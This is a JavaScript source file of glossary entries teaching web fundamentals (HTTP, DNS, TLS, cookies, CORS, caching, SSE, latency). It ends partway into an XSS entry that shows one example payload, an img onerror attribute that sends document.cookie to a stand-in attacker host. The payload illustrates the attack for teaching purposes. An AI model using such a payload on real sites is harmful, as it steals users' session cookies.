// How the Web Works: the plumbing every web app sits on.

import { AREA, doc, entry, input, INT, LOG, out } from './helpers.js';

const { WEB } = AREA;

export const WEB_ENTRIES = [
  entry('open-a-url', 'example', WEB, 'curious', 'What Happens When You Open a URL', {
    summary: 'Type an address, press Enter, see a page. In between: DNS, TCP, TLS, HTTP, a server, maybe a database, then HTML, CSS and JavaScript turned into pixels.',
    aliases: ['what happens when you type a URL', 'request lifecycle'],
    tags: ['walkthrough', 'foundations'],
    body: doc`
      The classic interview question, and the best map of the whole web. Say you open §https://app.example.com/notes§.

      ## 1. Find the server (DNS)
      The browser needs an IP address, not a name. It asks DNS: *what is app.example.com?* The answer (say §203.0.113.7§) is usually cached, so this often costs nothing; cold, it's a few round trips.

      ## 2. Open a connection (TCP, then TLS)
      The browser opens a TCP connection to port 443 — one round trip — then a TLS handshake agrees on encryption keys and checks the server's certificate — one more round trip with TLS 1.3. On a phone 100 ms from the server that's already ~300 ms before a single byte of your page moves.

      ## 3. Ask for the page (HTTP)
      Over the encrypted connection the browser sends an HTTP request:
      ~~~http
      GET /notes HTTP/1.1
      Host: app.example.com
      Cookie: session=8f2c…
      Accept: text/html
      ~~~

      ## 4. The server does its work
      A reverse proxy such as nginx passes the request to your app (Flask under Gunicorn). The route runs, maybe queries Postgres, maybe calls an LLM, and returns a response: a status code (§200 OK§), headers and a body.

      ## 5. Turn it into pixels
      The browser parses HTML into the DOM, fetches CSS and JavaScript (more requests, often from a CDN cache), lays out boxes and paints. With a React app, the HTML is nearly empty and JavaScript builds the page — then calls your JSON API for the data.

      ## Why it's worth knowing
      Every slow page, CORS error, expired certificate or "works on my machine" bug lives at one of these steps. Knowing the chain tells you where to look.
    `,
  }),

  entry('client-server', 'concept', WEB, 'curious', 'Client and Server', {
    summary: 'A client asks, a server answers. Your browser (or phone app, or script) is the client; the program holding the data and rules is the server.',
    aliases: ['client-server', 'client–server model', 'frontend and backend', 'full stack'],
    tags: ['foundations'],
    body: doc`
      ## The split
      - The **client** runs on the user's device: a browser showing your React app. It's untrusted — anyone can open DevTools and change anything in it.
      - The **server** runs on a machine you control: Flask, Postgres, your API keys. It's where the rules are enforced.

      Frontend = client code, backend = server code. "Full stack" = both.

      ## The one rule that follows
      **Never trust the client.** Hiding a button in React doesn't stop someone sending the request by hand with §curl§. Every check that matters — who is logged in, who may see which note, how many LLM calls a user gets — must run on the server. Likewise, an LLM API key must never be shipped in frontend code: anyone could copy it from the browser.

      ## Talking across the gap
      They communicate through HTTP requests and responses, usually carrying JSON. The server exposes an API; the client calls it. That contract — which URLs, which fields — is the seam of your whole app.
    `,
  }),

  entry('http', 'concept', WEB, 'curious', 'HTTP', {
    summary: 'The request–response language of the web: a method and path go out with headers, a status code and body come back. Plain text at heart, and stateless.',
    aliases: ['HTTP', 'HTTP request', 'HTTP response', 'HTTP headers', 'request headers', 'response headers', 'Hypertext Transfer Protocol'],
    tags: ['protocol', 'foundations'],
    year: 1991,
    body: doc`
      ## A request
      ~~~http
      POST /api/notes HTTP/1.1
      Host: localhost:5000
      Content-Type: application/json
      Authorization: Bearer eyJhbGciOi…

      {"title": "Attention", "body": "Q, K, V…"}
      ~~~
      A **method** (what to do), a **path** (to what), **headers** (metadata as §Name: value§ lines), a blank line, then an optional **body**.

      ## A response
      ~~~http
      HTTP/1.1 201 Created
      Content-Type: application/json
      Location: /api/notes/42

      {"id": 42, "title": "Attention"}
      ~~~

      ## Stateless
      Each request stands alone — the server doesn't remember the last one. Anything that must persist between requests (who you are, what's in your cart) is carried *in* each request, usually as a cookie or an §Authorization§ header, and looked up on the server.

      ## Versions
      HTTP/1.1 (1997) is text over TCP. HTTP/2 (2015) sends many requests down one connection at once, in binary frames. HTTP/3 (2022) runs over QUIC on UDP so a lost packet doesn't stall everything. Your Flask code doesn't change: the proxy in front speaks the newer versions, and the meaning — methods, status codes, headers — is the same.

      ## See it yourself
      Open DevTools → Network in any browser and click a request. Or: §curl -i https://example.com§.
    `,
  }),

  entry('http-methods', 'concept', WEB, 'curious', 'HTTP Methods', {
    summary: 'GET reads, POST creates, PUT replaces, PATCH edits, DELETE removes. The differences that matter are safety and idempotency — what happens if the request is retried.',
    aliases: ['HTTP methods', 'HTTP verbs', 'GET request', 'POST request', 'PUT request', 'PATCH request', 'DELETE request'],
    tags: ['protocol', 'api design'],
    body: doc`
      | Method | Meaning | Safe? | Idempotent? | Body? |
      |---|---|---|---|---|
      | GET | read | yes | yes | no |
      | POST | create / do something | no | **no** | yes |
      | PUT | replace whole thing | no | yes | yes |
      | PATCH | change some fields | no | usually not | yes |
      | DELETE | remove | no | yes | rarely |

      **Safe** means no side effects — browsers, crawlers and prefetchers assume GETs can be fired freely. So never make §GET /delete-account§: a link preview bot could click it.

      **Idempotent** means doing it twice has the same effect as once. §DELETE /notes/42§ twice still leaves note 42 deleted. §POST /notes§ twice makes *two* notes. This matters because networks fail: a client that times out doesn't know whether the server got the request. Retrying an idempotent request is always fine; retrying a POST needs care (an idempotency key).

      ## In Flask
      ~~~python
      @app.get("/api/notes/<int:note_id>")
      def get_note(note_id): ...

      @app.post("/api/notes")
      def create_note(): ...
      ~~~

      ## In React
      ~~~js
      await fetch("/api/notes", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title }),
      });
      ~~~
    `,
  }),

  entry('status-codes', 'concept', WEB, 'curious', 'HTTP Status Codes', {
    summary: 'Three digits that say how it went. 2xx worked, 3xx look elsewhere, 4xx you (the client) got it wrong, 5xx the server broke.',
    aliases: ['status code', 'status codes', 'HTTP status', '404', '500 error', '401 Unauthorized', '403 Forbidden', '429 Too Many Requests'],
    tags: ['protocol', 'debugging'],
    body: doc`
      ## The ones you'll actually meet
      - **200 OK** — fine. **201 Created** — made a new thing. **204 No Content** — fine, nothing to send back.
      - **301 / 302 / 307 / 308** — redirects; the §Location§ header says where. **304 Not Modified** — your cached copy is still good.
      - **400 Bad Request** — malformed input. **422 Unprocessable** — well-formed but invalid (validation failed).
      - **401 Unauthorized** — really means *unauthenticated*: who are you? **403 Forbidden** — I know who you are, and no.
      - **404 Not Found**. **405 Method Not Allowed** — right path, wrong method (a POST to a GET-only route — a classic Flask surprise).
      - **409 Conflict** — clashes with current state (duplicate username).
      - **429 Too Many Requests** — rate limited; back off. LLM APIs send this a lot.
      - **500 Internal Server Error** — an unhandled exception in your code. Check the server logs.
      - **502 Bad Gateway / 504 Gateway Timeout** — the proxy couldn't reach your app, or it took too long (a slow LLM call behind nginx's default 60 s timeout).
      - **503 Service Unavailable** — overloaded or down for maintenance.

      ## Debugging rule of thumb
      4xx: read the request you sent. 5xx: read the server's logs. A 502/504 usually means the app process crashed, isn't running, or is too slow — not that nginx is broken.
    `,
  }),

  entry('urls', 'concept', WEB, 'curious', 'URLs', {
    summary: 'scheme://host:port/path?query#fragment — each part has a job. The fragment never reaches the server; the query string does.',
    aliases: ['URL', 'URLs', 'query string', 'query parameters', 'URL encoding', 'percent-encoding', 'path parameters'],
    tags: ['foundations'],
    body: doc`
      ~~~text
      https://app.example.com:443/api/notes/42?include=links&limit=10#comments
      └─┬─┘   └──────┬──────┘ └┬┘└─────┬─────┘ └─────────┬────────┘ └───┬───┘
      scheme      host      port    path          query string     fragment
      ~~~

      - **Scheme** — how to talk: §https§, §http§, §ws§…
      - **Host** — which machine (resolved by DNS). **Port** — which program on it; defaults to 443 for https, 80 for http.
      - **Path** — which resource. §/api/notes/42§ is REST style: the 42 is a *path parameter*.
      - **Query string** — optional key=value pairs for filtering, paging, searching.
      - **Fragment** — after §#§. Stays in the browser; used for scrolling to a heading, and by some single-page apps for routing.

      ## Encoding
      URLs allow a limited alphabet, so spaces and symbols are percent-encoded: a space becomes §%20§, §&§ becomes §%26§. Use §encodeURIComponent()§ in JavaScript or let §requests§ / §fetch§ build the query for you — hand-gluing strings breaks the first time someone searches for "R&D".

      ## Don't put secrets here
      URLs end up in server logs, browser history and the §Referer§ header. Tokens and personal data belong in headers or the body.
    `,
  }),

  entry('dns', 'concept', WEB, 'curious', 'DNS', {
    summary: 'The internet’s phone book: turns names like example.com into IP addresses, through a hierarchy of servers and a lot of caching.',
    aliases: ['DNS', 'Domain Name System', 'domain name', 'DNS record', 'A record', 'CNAME'],
    tags: ['networking'],
    year: 1983,
    body: doc`
      ## The lookup
      Your computer asks a **resolver** (your ISP's, or 1.1.1.1 / 8.8.8.8). If it hasn't cached the answer, it walks the hierarchy: a **root** server says who handles §.com§, the §.com§ server says who handles §example.com§, and *that* server answers with the record.

      ## Records you'll set when deploying
      - **A** — name → IPv4 address. **AAAA** — name → IPv6.
      - **CNAME** — name → another name (§www§ → §myapp.onrender.com§).
      - **MX** — where email goes. **TXT** — free text, used to prove you own a domain.

      ## TTL and "DNS propagation"
      Every record has a time-to-live: how long resolvers may cache it. Change a record with a 1-hour TTL and some users see the old address for up to an hour. Lower the TTL a day before a planned move.

      ## localhost
      §localhost§ doesn't go through DNS at all — it's hard-wired to §127.0.0.1§, your own machine. That's where your dev servers live.

      "It's always DNS" is a sysadmin joke for a reason: when a site is unreachable and nothing else explains it, check name resolution with §nslookup example.com§.
    `,
  }),

  entry('tcp-ip', 'concept', WEB, 'curious', 'TCP/IP and Packets', {
    summary: 'IP moves packets between machines, best effort. TCP on top turns them into a reliable, ordered stream — at the cost of a handshake and retransmissions.',
    aliases: ['TCP', 'TCP/IP', 'IP address', 'packets', 'UDP', 'three-way handshake', 'QUIC'],
    tags: ['networking'],
    year: 1974,
    body: doc`
      ## Layers
      - **IP** (Internet Protocol) gets a packet — up to ~1,500 bytes — from one address to another, hop by hop through routers. Packets can be lost, duplicated or arrive out of order.
      - **TCP** numbers every byte, acknowledges what arrived, resends what didn't, and slows down when the network is congested. The app sees a clean, ordered stream.
      - **UDP** skips all that: fire and forget. Used for video calls, games, DNS — and QUIC, which rebuilds reliability on top of UDP for HTTP/3.

      ## The handshake cost
      TCP opens with SYN → SYN-ACK → ACK: one full round trip before any data. TLS adds another. That's why reusing connections (keep-alive, HTTP/2, connection pools to Postgres) matters so much more than raw bandwidth for small requests.

      ## Addresses and ports
      An IP address picks the machine; a port (0–65535) picks the program on it. §127.0.0.1:5000§ is "this machine, whatever is listening on port 5000" — your Flask dev server.

      ## Slow start
      A new TCP connection starts cautiously (about 10 packets ≈ 14 KB) and doubles each round trip. That's why the first 14 KB of a page is precious for load speed.
    `,
  }),

  entry('tls-https', 'concept', WEB, 'curious', 'TLS and HTTPS', {
    summary: 'HTTPS is HTTP inside TLS: encrypted so no one on the path can read or change it, and authenticated by a certificate so you know it’s really the site.',
    aliases: ['HTTPS', 'TLS', 'SSL', 'SSL certificate', 'TLS certificate', "Let's Encrypt", 'certificate authority'],
    tags: ['security', 'networking'],
    year: 1994,
    body: doc`
      ## Two jobs
      1. **Encryption** — the café Wi-Fi, your ISP and every router in between see only gibberish (they still see *which* site you're talking to).
      2. **Authentication** — the server proves it really is §app.example.com§ with a certificate signed by a certificate authority your browser trusts. Without this, encryption is useless: you could be encrypting straight to an attacker.

      ## The handshake, in one breath
      Client and server agree on ciphers, do a Diffie–Hellman key exchange (so they share a secret no eavesdropper can compute), the server presents its certificate and proves it holds the private key. TLS 1.3 does this in one round trip.

      ## For your project
      - Certificates are free and automatic with **Let's Encrypt**; hosting platforms (Render, Fly, Vercel…) handle it for you.
      - Cookies marked §Secure§ only travel over HTTPS. Many browser features (service workers, clipboard, microphone) require it.
      - In development, §http://localhost§ is treated as secure enough.

      ## What HTTPS doesn't do
      It protects data *in transit*. It says nothing about whether the server is honest, whether your database is encrypted, or whether your app has an XSS bug.
    `,
  }),

  entry('html', 'concept', WEB, 'curious', 'HTML', {
    summary: 'The structure of a page: nested elements like headings, paragraphs, links, buttons and forms. The browser turns it into a tree called the DOM.',
    aliases: ['HTML', 'HTML element', 'HTML tags', 'semantic HTML', 'HyperText Markup Language'],
    tags: ['frontend', 'foundations'],
    year: 1991,
    body: doc`
      ~~~html
      <!doctype html>
      <html lang="en">
        <head>
          <title>Notes</title>
          <link rel="stylesheet" href="/app.css">
        </head>
        <body>
          <main>
            <h1>My notes</h1>
            <form>
              <label for="q">Search</label>
              <input id="q" name="q">
              <button type="submit">Go</button>
            </form>
          </main>
          <script type="module" src="/main.js"></script>
        </body>
      </html>
      ~~~

      ## Semantic elements matter
      §<button>§ is focusable, clickable with the keyboard and announced as a button by screen readers. A §<div onClick>§ is none of those. §<main>§, §<nav>§, §<article>§, §<label>§ give structure that browsers, search engines and assistive tech understand for free — most accessibility is just using the right element.

      ## In a React app
      You'll rarely write a full HTML file: Vite gives you an §index.html§ with one empty §<div id="root">§, and React fills it from JSX. But JSX *is* HTML with JavaScript mixed in, so everything here still applies.
    `,
  }),

  entry('css', 'concept', WEB, 'curious', 'CSS', {
    summary: 'Rules that style HTML: colours, spacing, fonts and — hardest — layout. Flexbox for rows and columns, Grid for two-dimensional layouts.',
    aliases: ['CSS', 'stylesheet', 'flexbox', 'CSS grid', 'box model', 'media query', 'Cascading Style Sheets'],
    tags: ['frontend', 'styling'],
    year: 1996,
    body: doc`
      ## Selectors and rules
      ~~~css
      .card { padding: 16px; border-radius: 8px; background: var(--surface); }
      .card h2 { font-size: 1.25rem; }
      ~~~
      A selector picks elements; declarations style them. When rules conflict, **specificity** and order decide — the "cascade".

      ## The box model
      Every element is a box: content, then padding, then border, then margin. Put §box-sizing: border-box§ on everything so a §width§ includes padding and border — nearly every project does.

      ## Layout
      - **Flexbox** — one direction. A toolbar, a row of buttons, centring anything:
        §display: flex; align-items: center; justify-content: space-between; gap: 8px;§
      - **Grid** — rows *and* columns: §display: grid; grid-template-columns: 240px 1fr;§ for a sidebar layout.
      - **Media queries** — §@media (max-width: 640px) { … }§ to adapt for phones.

      ## Custom properties
      §--accent: #f0a449;§ then §color: var(--accent)§. How themes and dark mode are done — this app included.

      In a React project you'll often use Tailwind or CSS Modules instead of one big stylesheet, but it's all CSS underneath.
    `,
  }),

  entry('dom', 'concept', WEB, 'curious', 'The DOM', {
    summary: 'The live tree of objects the browser builds from HTML. JavaScript reads and changes it; every change can trigger re-layout and repaint.',
    aliases: ['DOM', 'Document Object Model', 'DOM tree', 'DOM node'],
    tags: ['frontend', 'browser'],
    body: doc`
      ## HTML becomes a tree
      Each element becomes a node with a parent and children. JavaScript can walk and change it:
      ~~~js
      const btn = document.querySelector("#save");
      btn.addEventListener("click", () => {
        document.querySelector("#status").textContent = "Saved!";
      });
      ~~~

      ## Why React exists
      Hand-editing the DOM is fine for one button and a nightmare for an app: every piece of data shown in three places must be updated in three places, in the right order, every time it changes. React flips this around — you describe what the UI *should* look like for the current state, and React works out the minimal DOM changes (reconciliation).

      ## Events bubble
      A click on a button fires on the button, then its parent, then up to §document§. That's why one listener on a list can handle clicks on all its rows, and why §event.stopPropagation()§ exists.

      ## Cost
      Reading layout (§offsetHeight§) right after changing styles forces the browser to recompute layout immediately. Doing that in a loop — "layout thrashing" — is a classic cause of janky pages.
    `,
  }),

  entry('javascript', 'concept', WEB, 'curious', 'JavaScript', {
    summary: 'The only language browsers run natively. Dynamic, single-threaded with an event loop, full of quirks — and, with TypeScript on top, what your whole frontend is written in.',
    aliases: ['JavaScript', 'ECMAScript', 'vanilla JS'],
    tags: ['language', 'frontend'],
    year: 1995,
    body: doc`
      ## Coming from Python
      | Python | JavaScript |
      |---|---|
      | §def f(x):§ | §function f(x) {}§ or §const f = (x) => {}§ |
      | §None§ | §null§ *and* §undefined§ |
      | §dict§ | object §{a: 1}§ or §Map§ |
      | §list§ | array §[1, 2]§ |
      | f-string §f"{x}"§ | template literal §\${x}§ inside backticks |
      | §a == b§ | §a === b§ (never §==§) |
      | §for x in xs§ | §for (const x of xs)§ |

      ## Idioms React code leans on
      ~~~js
      const { title, tags = [] } = note;          // destructuring with default
      const updated = { ...note, title: "New" };  // copy with one field changed
      const items = [...list, newItem];           // new array, old one untouched
      const names = users.map((u) => u.name);     // transform
      const done = todos.filter((t) => t.done);   // select
      const label = user?.profile?.name ?? "anon"; // optional chaining, fallback
      ~~~
      The spread-and-copy style matters: React notices changes by comparing references, so you make new objects instead of mutating old ones.

      ## Single-threaded
      One thread runs your code. Waiting on the network never blocks because I/O is handed off and resumed later by the event loop — which is what §async§/§await§ is sugar over.

      ## Quirks worth a laugh
      §0.1 + 0.2 === 0.30000000000000004§ (that's floating point, not JavaScript), §[] + {}§ is a string, and §typeof null === "object"§ — a bug from 1995 kept for compatibility.
    `,
  }),

  entry('json', 'concept', WEB, 'curious', 'JSON', {
    summary: 'The text format APIs speak: objects, arrays, strings, numbers, booleans and null. It maps neatly onto Python dicts and JavaScript objects.',
    aliases: ['JSON', 'JavaScript Object Notation', 'JSON.stringify', 'JSON.parse'],
    tags: ['data', 'api'],
    year: 2001,
    body: doc`
      ~~~json
      {
        "id": 42,
        "title": "Attention",
        "tags": ["ml", "transformers"],
        "pinned": false,
        "parent": null
      }
      ~~~

      ## Moving between worlds
      - Python: §json.dumps(obj)§ / §json.loads(text)§; Flask's §jsonify§ and §request.get_json()§ do it for you.
      - JavaScript: §JSON.stringify(obj)§ / §JSON.parse(text)§; §await response.json()§ after §fetch§.
      - Postgres: the §jsonb§ column type stores and indexes it.
      - LLMs: structured output means getting the model to answer in valid JSON matching a schema.

      ## Gotchas
      - No dates. Send ISO 8601 strings (§"2026-09-23T10:15:00Z"§) and parse them at each end.
      - No comments, no trailing commas, keys must be double-quoted.
      - Numbers are doubles in JavaScript: an ID above 2⁵³ ≈ 9×10¹⁵ silently loses precision. Big IDs travel as strings.
      - Python's §Decimal§ and §datetime§ aren't JSON-serialisable by default — convert them first.
    `,
  }),

  entry('apis', 'concept', WEB, 'curious', 'APIs', {
    summary: 'An API is a contract for how programs talk to each other: which requests you can make and what comes back. For web apps, usually URLs that take and return JSON.',
    aliases: ['API', 'APIs', 'web API', 'API endpoint', 'endpoint', 'endpoints'],
    tags: ['foundations', 'api'],
    body: doc`
      ## Many meanings, one idea
      "Application Programming Interface" covers a Python library's functions, the browser's §fetch§, and — most often here — a set of HTTP endpoints. Each is a promise: *call me like this and you get that*.

      ## Your app has two kinds
      1. **Your own API** — Flask routes like §GET /api/notes§ that your React app calls. You design this one.
      2. **Other people's APIs** — an LLM provider, a payment service, GitHub. You call these from your *server*, where the keys live.

      ## Designing a good one
      - Nouns in paths, verbs as methods: §POST /api/notes§, not §/api/createNote§.
      - Consistent errors: always §{"error": "...", "detail": ...}§ with the right status code.
      - Pagination from day one for anything that can grow: §?limit=20&cursor=...§.
      - Version it (§/api/v1/§) if other people depend on it.
      - Write it down — an OpenAPI spec, or just a README table.

      ## The frontend–backend seam
      Agree on the JSON shape first and both halves can be built in parallel, with the frontend using a fake response until the real endpoint exists.
    `,
  }),

  entry('rest', 'concept', WEB, 'curious', 'REST', {
    summary: 'A style of API design: resources at URLs, standard HTTP methods to act on them, stateless requests. Most “REST APIs” follow it loosely, and that’s fine.',
    aliases: ['REST', 'REST API', 'RESTful', 'CRUD'],
    tags: ['api design'],
    year: 2000,
    body: doc`
      ## Resources and methods
      | Request | Meaning |
      |---|---|
      | §GET /api/notes§ | list notes |
      | §POST /api/notes§ | create a note |
      | §GET /api/notes/42§ | read note 42 |
      | §PATCH /api/notes/42§ | edit some fields |
      | §DELETE /api/notes/42§ | delete it |
      | §GET /api/notes/42/links§ | a sub-resource |

      That's **CRUD** — create, read, update, delete — mapped onto HTTP. Most of a typical app is exactly this over a few tables.

      ## Where it bends
      - Actions that aren't CRUD: §POST /api/notes/42/summarize§ is fine. Don't contort it.
      - An LLM chat endpoint that streams isn't very RESTful either — it's a long-running action that returns a stream.

      ## Alternatives
      **GraphQL** lets the client ask for exactly the fields it needs in one request — great for many clients with different needs, overkill for one React app and one Flask server. **RPC** styles (gRPC, tRPC) treat the API as function calls. For a side project, plain REST-ish JSON is the right default.

      Roy Fielding described REST in his 2000 PhD thesis; "RESTful" in practice mostly means "JSON over HTTP with sensible URLs".
    `,
  }),

  entry('cookies', 'concept', WEB, 'curious', 'Cookies', {
    summary: 'Small key–value pairs the server asks the browser to store and send back with every request to that site. How logins survive between requests.',
    aliases: ['cookie', 'cookies', 'session cookie', 'Set-Cookie', 'HttpOnly', 'SameSite'],
    tags: ['auth', 'browser'],
    year: 1994,
    body: doc`
      ## How they work
      The server responds with a header:
      ~~~http
      Set-Cookie: session=8f2c9a…; HttpOnly; Secure; SameSite=Lax; Max-Age=604800; Path=/
      ~~~
      From then on the browser attaches §Cookie: session=8f2c9a…§ to every request to that site, automatically. HTTP is stateless; cookies are the memory bolted on.

      ## The flags that make them safe
      - **HttpOnly** — JavaScript can't read it, so an XSS bug can't steal the session.
      - **Secure** — only sent over HTTPS.
      - **SameSite=Lax** — not sent on most cross-site requests, which blocks most CSRF. §Strict§ is tighter; §None§ (requires §Secure§) is for deliberate cross-site use.
      - **Max-Age / Expires** — without them it's a session cookie that dies when the browser closes.

      ## Cookies vs tokens in localStorage
      A token kept in §localStorage§ and sent as an §Authorization§ header is readable by any script on the page — one XSS and it's gone. An HttpOnly cookie isn't. For a React app talking to its own Flask backend on the same site, an HttpOnly session cookie is usually the safer default.

      Flask's built-in §session§ stores data in a signed cookie — signed so it can't be forged, but *not* encrypted, so don't put secrets in it.
    `,
  }),

  entry('cors', 'concept', WEB, 'curious', 'CORS', {
    summary: 'Browsers block JavaScript on one origin from reading responses from another unless the server says it’s allowed. The #1 error when React on :5173 calls Flask on :5000.',
    aliases: ['CORS', 'cross-origin', 'same-origin policy', 'preflight request', 'Access-Control-Allow-Origin'],
    tags: ['security', 'browser', 'debugging'],
    body: doc`
      ## The rule
      An **origin** is scheme + host + port. §http://localhost:5173§ (Vite) and §http://localhost:5000§ (Flask) are *different origins*. By the **same-origin policy**, JavaScript on one can send a request to the other, but can't read the response unless the server replies with:
      ~~~http
      Access-Control-Allow-Origin: http://localhost:5173
      ~~~
      For non-simple requests (JSON bodies, custom headers like §Authorization§), the browser first sends an §OPTIONS§ **preflight** asking permission.

      ## Why it exists
      Without it, any website you visit could use your logged-in cookies to read your email from another tab. CORS is the server opting *in* to being read cross-origin.

      ## Fixes, best first
      1. **Don't be cross-origin.** In development, have Vite proxy §/api§ to Flask (§server.proxy§ in §vite.config.js§); in production, serve both from one domain. No CORS needed at all.
      2. If you must: §flask-cors§ with an explicit origin list — §CORS(app, origins=["https://myapp.com"], supports_credentials=True)§.
      3. Never §*§ together with cookies (browsers refuse it anyway).

      ## Important
      CORS is enforced by *browsers*. §curl§, Python scripts and Postman ignore it entirely. It protects users, not your server — authentication still matters.
    `,
  }),

  entry('web-caching-cdn', 'concept', WEB, 'curious', 'HTTP Caching and CDNs', {
    summary: 'Headers tell browsers and CDNs how long they may reuse a response. Content-hashed filenames plus long cache lifetimes make repeat visits nearly free.',
    aliases: ['HTTP caching', 'Cache-Control', 'CDN', 'content delivery network', 'ETag', 'cache busting'],
    tags: ['performance'],
    body: doc`
      ## Cache-Control
      - §Cache-Control: max-age=31536000, immutable§ — keep for a year, never re-check. For files whose name changes when their content does.
      - §Cache-Control: no-cache§ — you may store it but must check with the server first (cheap with an **ETag**: the server replies §304 Not Modified§ with no body).
      - §Cache-Control: no-store§ — never store (private data).
      - §private§ vs §public§ — whether shared caches such as CDNs may keep it.

      ## The build-tool trick
      Vite names files like §assets/index-3f9a1c.js§ — the hash of the contents. Change a line and the name changes. So JS and CSS get cached forever, and §index.html§ (which points at the current names) gets §no-cache§. Deploys take effect instantly; repeat visits download nothing.

      ## CDNs
      A content delivery network keeps copies of your static files in hundreds of cities, so the bytes travel 20 km instead of 5,000. Light in fibre takes ~25 ms each way for 5,000 km — a CDN hit can be 10× faster. Hosting platforms usually include one.

      ## Don't cache API responses by accident
      Anything personalised (§/api/me§) needs §private§ or §no-store§, or a shared cache might serve one user's data to another.
    `,
  }),

  entry('sse-websockets', 'concept', WEB, 'curious', 'Server-Sent Events and WebSockets', {
    summary: 'Two ways to push data to the browser as it happens. SSE is one-way over plain HTTP — perfect for streaming LLM tokens. WebSockets are two-way.',
    aliases: ['Server-Sent Events', 'SSE', 'WebSocket', 'WebSockets', 'EventSource', 'text/event-stream', 'long polling'],
    tags: ['streaming', 'protocol'],
    body: doc`
      ## Why
      A normal HTTP response arrives all at once. An LLM producing 500 tokens at 50 tokens/s would leave the user staring at a spinner for 10 seconds. Streaming shows words as they're generated.

      ## Server-Sent Events
      The server keeps the response open and writes lines as things happen:
      ~~~text
      Content-Type: text/event-stream

      data: {"delta": "Atten"}

      data: {"delta": "tion is"}

      data: [DONE]
      ~~~
      Each event is §data: …§ followed by a blank line. It's plain HTTP, works through most proxies (turn off buffering), and is how most LLM APIs stream to *you*. The browser's §EventSource§ reads it for GETs; for POSTs, read §response.body§ from §fetch§ as a stream.

      ## WebSockets
      An HTTP request that "upgrades" into a persistent two-way channel. Needed for chat between users, multiplayer, collaborative editing — anything where the client also pushes a steady stream. More moving parts: sticky connections, reconnect logic, and Flask needs extra help (flask-sock or an async server).

      ## Rule of thumb
      Server → client only (LLM output, progress bars, notifications)? **SSE**. Both directions, low latency? **WebSockets**. Updates every few minutes? Just poll.
    `,
  }),

  entry('browser-rendering', 'concept', WEB, 'curious', 'How a Browser Draws a Page', {
    summary: 'HTML → DOM, CSS → CSSOM, combined into a render tree, laid out, painted, composited. JavaScript can pause any of it.',
    aliases: ['critical rendering path', 'layout and paint', 'reflow', 'Core Web Vitals', 'render-blocking'],
    tags: ['browser', 'performance'],
    body: doc`
      ## The pipeline
      1. **Parse HTML** into the DOM, streaming as bytes arrive.
      2. **Parse CSS** into the CSSOM. CSS is *render-blocking*: nothing paints until it's loaded, or you'd see unstyled flashes.
      3. **Scripts**: a plain §<script>§ stops HTML parsing until it downloads and runs. §defer§ and §type="module"§ scripts wait until parsing is done — the usual choice.
      4. **Layout**: compute every box's size and position.
      5. **Paint** pixels, then **composite** layers on the GPU.

      ## Changes are not equal
      Changing §transform§ or §opacity§ only re-composites — cheap, smooth animations. Changing §width§ or adding elements re-runs layout for a chunk of the page — expensive if repeated every frame.

      ## What users feel (Core Web Vitals)
      - **LCP** (largest contentful paint): when the main content appears. Aim under 2.5 s.
      - **INP** (interaction to next paint): how fast the page responds to a click. Aim under 200 ms.
      - **CLS** (cumulative layout shift): how much things jump around as they load. Give images a size.

      A single-page React app pays extra on first load — download JS, run it, *then* fetch data, *then* render. That's what server rendering, code splitting and skeleton screens try to hide.
    `,
  }),

  entry('latency-bandwidth', 'equation', WEB, 'curious', 'Latency and Bandwidth', {
    summary: 'Latency is how long one trip takes; bandwidth is how much fits through per second. For most web requests latency dominates — and it has a floor set by the speed of light.',
    aliases: ['latency', 'bandwidth', 'round trip time', 'RTT', 'round trip', 'throughput'],
    tags: ['performance', 'networking', 'physics'],
    latex: doc`t \approx n_{\text{RTT}} \cdot \text{RTT} + \frac{\text{size}}{\text{bandwidth}}, \qquad \text{RTT} \geq \frac{2d}{c/n_{\text{glass}}}`,
    variables: [
      ['t', 'Time to fetch something'],
      [doc`n_{\text{RTT}}`, 'Round trips needed (DNS, TCP, TLS, the request itself)'],
      [doc`\text{RTT}`, 'Round-trip time: there and back'],
      ['d', 'Distance to the server'],
      [doc`c/n_{\text{glass}}`, 'Speed of light in optical fibre, about 2/3 of c (refractive index ≈ 1.47)'],
    ],
    body: doc`
      ## Two different limits
      Think of a pipe: bandwidth is its width, latency is its length. A 100 MB file on a 100 Mbit/s line takes 8 s no matter how close the server is. A 2 KB API response takes one round trip no matter how wide the pipe is.

      ## The physics floor
      Light in glass travels at ~2×10⁸ m/s. Mumbai to a server in Virginia is ~13,000 km of fibre path: one round trip is at least 2 × 13,000 km ÷ 204,000 km/s ≈ **127 ms**, and real routes add 50–100%. No upgrade can beat that — only moving the server (or a CDN copy) closer.

      ## Why round trips pile up
      A cold HTTPS request needs DNS (1), TCP (1), TLS 1.3 (1), then the request (1): four round trips. At 200 ms RTT that's 0.8 s before your code has even run. A React app that then fetches §/api/me§, then §/api/notes§, then each note's links one after another, adds a round trip per step — the network version of the N+1 query problem.

      ## Levers
      Reuse connections, batch requests, fetch in parallel (§Promise.all§), put static files on a CDN, host near your users.
    `,
    calc: {
      inputs: [
        input('dist', 'Distance to server', 'km', 13000, 1, 20000, LOG),
        input('trips', 'Round trips', '', 4, 1, 20, INT),
        input('size', 'Response size', 'KB', 200, 0.1, 100000, LOG),
        input('mbps', 'Bandwidth', 'Mbit/s', 50, 0.5, 10000, LOG),
        input('overhead', 'Real route vs straight fibre', '×', 1.5, 1, 3),
      ],
      outputs: [
        out('Light-in-fibre round trip (floor)', 's', '2*dist*1000/(c/1.47)', { key: 'floor', prefix: true }),
        out('Realistic round trip', 's', 'floor*overhead', { key: 'rtt', prefix: true }),
        out('Time spent on round trips', 's', 'trips*rtt', { key: 'tl', prefix: true }),
        out('Time spent transferring bytes', 's', 'size*8*1000/(mbps*1e6)', { key: 'tb', prefix: true }),
        out('Total', 's', 'tl + tb', { prefix: true }),
        out('Share of time that is latency', '%', 'tl/(tl + tb)*100', { digits: 3 }),
      ],
      note: 'Try a 2 KB API response: latency is nearly everything. Then a 50 MB model file: bandwidth takes over. Distance 10 km is a CDN hit.',
    },
  }),

  entry('xss', 'concept', WEB, 'curious', 'Cross-Site Scripting (XSS)', {
    summary: 'Attacker-controlled text ends up running as JavaScript in someone else’s browser. React escapes text by default; dangerouslySetInnerHTML and rendered Markdown are where it bites.',
    aliases: ['XSS', 'cross-site scripting', 'dangerouslySetInnerHTML', 'Content Security Policy', 'CSP'],
    tags: ['security'],
    body: doc`
      ## The attack
      A user saves a note titled §<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">§. If your page inserts that title as HTML, every visitor who sees it runs the attacker's script — with their session.

